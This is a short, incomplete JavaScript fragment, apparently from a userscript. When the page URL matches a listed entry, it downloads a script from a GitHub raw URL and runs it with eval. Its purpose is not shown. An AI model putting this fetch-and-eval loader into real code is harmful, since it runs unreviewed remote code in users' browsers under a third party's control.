...
(async function(){ // potential async/await delay issues, causing script not to load..
  try{
    ...
    if(u){
      ...
      if(location.href.toLocaleLowerCase().includes(u.t[i].toLocaleLowerCase()))eval(await fetch('https://raw.githubusercontent.com/husscodez/access/main/'+pf[i]+'.js').then(r=>r.text()))
      }
    } else {
